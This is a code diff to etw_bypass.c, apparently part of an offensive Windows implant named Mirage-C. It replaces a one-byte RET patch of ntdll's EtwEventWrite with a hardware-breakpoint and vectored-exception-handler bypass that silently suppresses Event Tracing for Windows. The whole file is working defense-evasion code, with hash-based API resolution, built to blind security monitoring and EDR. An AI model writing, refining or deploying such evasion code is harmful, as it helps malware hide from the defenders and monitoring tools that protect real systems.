@@ -1,9 +1,9 @@
 /*
  * etw_bypass.c — ETW bypass for Mirage-C
  *
- * Direct translation of Zig src/evasion/etw_bypass.zig.
- * Patches ntdll!EtwEventWrite (or EtwEventWriteEx as fallback)
- * with a single RET instruction (0xC3) to suppress ETW events.
+ * Hardware breakpoint technique: sets DR0 on EtwEventWrite,
+ * installs a VEH that intercepts execution and returns
+ * STATUS_SUCCESS (0) without patching .text section.
  */
 
 #include "etw_bypass.h"
@@ -15,67 +15,127 @@
 #include "export_resolve.h"
 #include "hash.h"
 #include "nt_types.h"
+#include "mirage_asm.h"
 #include <string.h>
 
-/* ── Helper: resolve function from module by hash ─────────── */
+/* ── CONTEXT offsets for x64 ──────────────────────────────── */
+
+#define CTX_RAX   0x078
+#define CTX_RSP   0x098
+#define CTX_RIP   0x0f8
+#define CTX_DR0   0x048
+#define CTX_DR7   0x070
+
+#define EXCEPTION_SINGLE_STEP  0x80000004
+#define EXCEPTION_CONTINUE_EXECUTION (-1)
+
+#define DR7_ENABLE_DR0_EXE  0x0000000000000001ULL
+
+/* ── Function pointer types ───────────────────────────────── */
+
+typedef LONG (WINAPI *pRtlAddVectoredExceptionHandler)(ULONG, void *);
+typedef LONG (WINAPI *pRtlRemoveVectoredExceptionHandler)(void *);
+
+/* ── State ────────────────────────────────────────────────── */
+
+static void *g_etw_write = NULL;
+static void *g_veh_handle = NULL;
+static pRtlRemoveVectoredExceptionHandler g_fnRemoveVEH = NULL;
+
+/* ── VEH handler ──────────────────────────────────────────── */
+
+static LONG CALLBACK etw_veh_handler(EXCEPTION_POINTERS *ep) {
+    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
+        return 0;
+
+    DWORD64 *ctx = (DWORD64 *)ep->ContextRecord;
+    DWORD64 rip = ctx[CTX_RIP / 8];
+
+    if ((void *)rip != g_etw_write)
+        return 0;
+
+    DWORD64 rsp = ctx[CTX_RSP / 8];
+    DWORD64 ret_addr = *(DWORD64 *)rsp;
+
+    ctx[CTX_RIP / 8] = ret_addr;
+    ctx[CTX_RSP / 8] = rsp + 8;
+    ctx[CTX_RAX / 8] = 0; /* STATUS_SUCCESS */
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+/* ── Helper ───────────────────────────────────────────────── */
 
 static void* resolve_func(void* mod, const char* name) {
     uint32_t h = mirage_encrypted_hash_func(name);
     return mirage_get_function_by_hash(mod, h);
 }
 
-/* ── Helper: patch first byte of function ─────────────────── */
+/* ── Cleanup ──────────────────────────────────────────────── */
 
-static int patch_first_byte(void* func_ptr) {
-    PVOID base = func_ptr;
-    SIZE_T size = 1;
-    ULONG old_prot = 0;
-
-    NTSTATUS status = mirage_NtProtectVirtualMemory(
-        (HANDLE)(intptr_t)(~0ULL),
-        &base, &size,
-        PAGE_EXECUTE_READWRITE,
-        &old_prot
-    );
-    if (status < 0) return 0;
-
-    volatile uint8_t* patch = (volatile uint8_t*)func_ptr;
-    patch[0] = 0xC3;
-
-    mirage_NtFlushInstructionCache(
-        (HANDLE)(intptr_t)(~0ULL),
-        func_ptr, 1
-    );
-
-    PVOID restore_base = func_ptr;
-    SIZE_T restore_size = 1;
-    mirage_NtProtectVirtualMemory(
-        (HANDLE)(intptr_t)(~0ULL),
-        &restore_base, &restore_size,
-        old_prot, &old_prot
-    );
-
-    return 1;
+static void etw_cleanup(void) {
+    if (g_veh_handle && g_fnRemoveVEH) {
+        g_fnRemoveVEH(g_veh_handle);
+        g_veh_handle = NULL;
+    }
+    if (g_etw_write) {
+        CONTEXT ctx;
+        memset(&ctx, 0, sizeof(ctx));
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        NTSTATUS st = NtGetContextThread_stub(
+            (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
+        if (st >= 0) {
+            *(DWORD64 *)((char *)&ctx + CTX_DR0) = 0;
+            *(DWORD64 *)((char *)&ctx + CTX_DR7) = 0;
+            NtSetContextThread_stub(
+                (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
+        }
+        g_etw_write = NULL;
+    }
 }
 
 /* ── mirage_patch_etw ─────────────────────────────────────── */
 
 int mirage_patch_etw(void) {
     void* ntdll = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("ntdll.dll")
-    );
+        mirage_encrypted_hash_module("ntdll.dll"));
     if (!ntdll) return 0;
 
+    /* Resolve EtwEventWrite (fallback to EtwEventWriteEx) */
     void* etw_write = resolve_func(ntdll, "EtwEventWrite");
-    if (etw_write)
-        return patch_first_byte(etw_write);
+    if (!etw_write)
+        etw_write = resolve_func(ntdll, "EtwEventWriteEx");
+    if (!etw_write) return 0;
 
-    /* Fallback to EtwEventWriteEx */
-    void* etw_write_ex = resolve_func(ntdll, "EtwEventWriteEx");
-    if (etw_write_ex)
-        return patch_first_byte(etw_write_ex);
+    /* Resolve VEH functions */
+    pRtlAddVectoredExceptionHandler fnAddVEH =
+        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll,
+            "RtlAddVectoredExceptionHandler");
+    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll,
+            "RtlRemoveVectoredExceptionHandler");
+    if (!fnAddVEH || !g_fnRemoveVEH) return 0;
 
-    return 0;
+    /* Install VEH */
+    g_veh_handle = fnAddVEH(1, etw_veh_handler);
+    if (!g_veh_handle) return 0;
+
+    /* Set DR0 = EtwEventWrite address */
+    CONTEXT ctx;
+    memset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    NTSTATUS st = NtGetContextThread_stub(
+        (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
+    if (st < 0) { etw_cleanup(); return 0; }
+
+    *(DWORD64 *)((char *)&ctx + CTX_DR0) = (DWORD64)etw_write;
+    *(DWORD64 *)((char *)&ctx + CTX_DR7) = DR7_ENABLE_DR0_EXE;
+
+    st = NtSetContextThread_stub(
+        (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
+    if (st < 0) { etw_cleanup(); return 0; }
+
+    g_etw_write = etw_write;
+    return 1;
 }
 
 #endif /* ENABLE_ETW_BYPASS */
